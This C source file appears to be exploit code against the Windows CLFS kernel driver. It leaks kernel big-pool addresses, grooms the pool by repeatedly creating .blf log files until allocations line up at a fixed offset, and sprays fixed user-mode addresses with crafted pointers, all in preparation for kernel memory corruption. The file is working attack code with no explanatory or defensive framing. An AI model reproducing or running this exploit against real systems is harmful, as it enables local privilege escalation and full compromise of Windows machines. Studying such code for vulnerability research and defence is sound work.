#include "Prepare_BigPool.h"
#include <time.h>

UINT num_of_CLFS = 0;
PUINT p_num_of_CLFS = &num_of_CLFS; // number of CLFS tags
PUINT64 ClfsAddrArray = 0;
ULONG count = 0; // number of big pool entries
PUINT64 StoreClfsAddrArray = 0;

PUINT64 GetBigPoolInfo() {
	DWORD* bigPoolBuffer = (DWORD*)VirtualAlloc(0, 0x1000, MEM_COMMIT, PAGE_READWRITE);
	if (!bigPoolBuffer) {
		printf("[-] Failed to allocate memory for big pool buffer.\n");
		exit(EXIT_FAILURE);
	}
	// First query to determine required size
	ULONG returnLength = 0;
	ULONG bufferSize = 0;
	NTSTATUS status = fnNtQuerySystemInformation(SystemBigPoolInformation, bigPoolBuffer, 0x1000, &returnLength);
	if (status == STATUS_INFO_LENGTH_MISMATCH) {
		VirtualFree(bigPoolBuffer, 0, MEM_RELEASE);
		bufferSize = returnLength;
		bigPoolBuffer = (DWORD*)VirtualAlloc(0, bufferSize, MEM_COMMIT, PAGE_READWRITE);
		if (!bigPoolBuffer) {
			printf("[-] Failed to allocate memory for big pool buffer.\n");
			exit(EXIT_FAILURE);
		}
	}

	// Second query to get actual data
	status = fnNtQuerySystemInformation(SystemBigPoolInformation, bigPoolBuffer, bufferSize, &returnLength);
	SYSTEM_BIGPOOL_INFORMATION* bigPoolInfo = (SYSTEM_BIGPOOL_INFORMATION*)bigPoolBuffer;
	count = bigPoolInfo->Count;
	//printf("[+] Number of Big Pool Entries: %lu\n", count);
	ClfsAddrArray = (PUINT64)malloc(count * sizeof(UINT64));
	if (!ClfsAddrArray) {
		printf("[-] Failed to allocate memory for kernel address array.\n");
		VirtualFree(bigPoolBuffer, 0, MEM_RELEASE);
		exit(EXIT_FAILURE);
	}
	//printf("[+] Kernel address array allocated at: %p\n", ClfsAddrArray);
	memset(ClfsAddrArray, 0, count * sizeof(UINT64));

	num_of_CLFS = 0; // Reset the count of CLFS tags found
	for (int i = count - 1; i >= 0;i--) {
		if (bigPoolInfo->AllocatedInfo[i].SizeInBytes == 0x7a00) {
			if (bigPoolInfo->AllocatedInfo[i].TagUlong == CLFS_TAG) {
				//printf("[+] Found CLFS tag at index %u, Virtual Address: %p\n", i, bigPoolInfo->AllocatedInfo[i].VirtualAddress);
				ClfsAddrArray[num_of_CLFS] = (UINT64)bigPoolInfo->AllocatedInfo[i].VirtualAddress;
				num_of_CLFS++;
			}
		}
	}
	//printf("[+] Number of CLFS tags found: %u\n", num_of_CLFS);
	return ClfsAddrArray;  
}

UINT64 findNewClfsAddress(PUINT64 OldClfsAddrArray, PUINT64 NewClfsAddrArray) {
	int sz = num_of_CLFS;
	for (int i = 0; i < sz-2; i++) {
		if (OldClfsAddrArray[i] == NewClfsAddrArray[i]) continue;
		return NewClfsAddrArray[i];
	}
	return NewClfsAddrArray[sz - 1]; 
}

VOID GetOffsetBetweenPools() {
	UINT64 lastFoundClfsAddr = 0;
	UINT64 previousClfsAddr = 0;
	UINT64 offsetClfs = 0;
	WCHAR* logFileNameBuffer = (WCHAR*)malloc(0x1000);
	int vs_segmentCount = 0;
	if (!logFileNameBuffer) {
		printf("[-] Failed to allocate memory for log file name buffer.\n");
		exit(EXIT_FAILURE);
	}
	// Get the initial CLFS addresses
	PUINT64 OldClfsAddrArray = GetBigPoolInfo();

	// Create new .blf file 
	srand((unsigned int)time(NULL)); // Seed the random number generator
	memset(logFileNameBuffer, 0, 0x1000);
	unsigned int randValue = rand();
	wsprintfW(logFileNameBuffer, L"LOG:C:\\Users\\goose\\Desktop\\MyLog_%d", randValue);
	HANDLE logFile = CreateLogFile(logFileNameBuffer, GENERIC_READ | GENERIC_WRITE, 3, 0, 4, 0);
	if (logFile == (HANDLE)-1) {
		DWORD error = GetLastError();
		printf("[-] Could not create log file, error: %d\n", error);
		free(logFileNameBuffer);
		exit(EXIT_FAILURE);
	}
	// Get new CLFS addresses
	PUINT64 NewClfsAddrArray = GetBigPoolInfo();
	// Find the new CLFS address
	lastFoundClfsAddr = findNewClfsAddress(OldClfsAddrArray, NewClfsAddrArray);
	if (lastFoundClfsAddr == 0) {
		printf("[-] No new CLFS address found.\n");
		free(logFileNameBuffer);
		exit(EXIT_FAILURE);
	}
	//printf("[+] New BigPool Address of CLFS tag: %p\n", lastFoundClfsAddr);

	while (true) {
		previousClfsAddr = lastFoundClfsAddr; // Store the last found address
		// create .blf file
		memset(logFileNameBuffer, 0, 0x1000);
		randValue = rand();
		wsprintfW(logFileNameBuffer, L"LOG:C:\\Users\\goose\\Desktop\\MyLog_%d", randValue);
		logFile = CreateLogFile(logFileNameBuffer, GENERIC_READ | GENERIC_WRITE, 3, 0, 4, 0);
		if (logFile == (HANDLE)-1) {
			DWORD error = GetLastError();
			printf("[-] Could not create log file, error: %d\n", error);
			free(logFileNameBuffer);
			exit(EXIT_FAILURE);
		}
		// Get new CLFS addresses
		OldClfsAddrArray = NewClfsAddrArray;
		NewClfsAddrArray = GetBigPoolInfo();
		// Find the new CLFS address
		lastFoundClfsAddr = findNewClfsAddress(OldClfsAddrArray, NewClfsAddrArray);
		StoreClfsAddrArray = NewClfsAddrArray;
		if (lastFoundClfsAddr == 0) {
			printf("[-] No new CLFS address found.\n");
			free(logFileNameBuffer);
			exit(EXIT_FAILURE);
		}
		//printf("[+] New BigPool Address of CLFS tag: %p\n", lastFoundClfsAddr);
		if (previousClfsAddr) {
			if (previousClfsAddr > lastFoundClfsAddr) {
				offsetClfs = previousClfsAddr - lastFoundClfsAddr;
			}
			else {
				offsetClfs = lastFoundClfsAddr - previousClfsAddr;
			}
			printf("[+] Offset -----> %llx\n", offsetClfs);
			if (offsetClfs == 0x11000) {
				vs_segmentCount++;
			}
			else {
				vs_segmentCount = 0;
			}
		}
		if (vs_segmentCount == 6) {
			printf("[+] Found 6 consecutive segments with the same offset, stopping.\n");
			break;
		}
	}
}

int doHeapSpray() {

	UINT64 alloc01 = 0x10000;


	if (!VirtualAlloc((LPVOID)0x5000000, 0x100000, 0x3000, 4)) {
		printf("[-] Failed to allocate memory\n");
		return 0;
	}
	if (!VirtualAlloc((LPVOID)0x100000, 0x1000000, 0x3000, 4)) {
		DWORD lastError = GetLastError();
		printf("[-] Failed to allocate memory at address 0x1000\n");
		return 0;
	}
	for (int i = 0xe; i < 0x1000000- 0x400000; i += 0x10)
		*(UINT64*)(i + 0x400000) = 0x5000000;
	if (!VirtualAlloc((LPVOID)0x30C1FD0000, 0x10000, 0x3000, 4)) {
		DWORD lastError = GetLastError();
		printf("[-] Failed to allocate memory at address 0x30C1FD0000\n");
		return 0;
	}
	if (!VirtualAlloc((LPVOID)0xfffff000, 0x10000, 0x3000, 4)) {
		DWORD lastError = GetLastError();
		printf("[-] Failed to allocate memory at address 0xfffff000\n");
		return 0;
	}
	for (int i = 0x6; i < 0x10000 - 0x10; i += 0x10) {
		*(UINT64*)(0x30C1FD0000 + i) = 0x5000000;
	}
	*(UINT64*)0x0000030c1fdf026 = 0;
	
	return 0;
}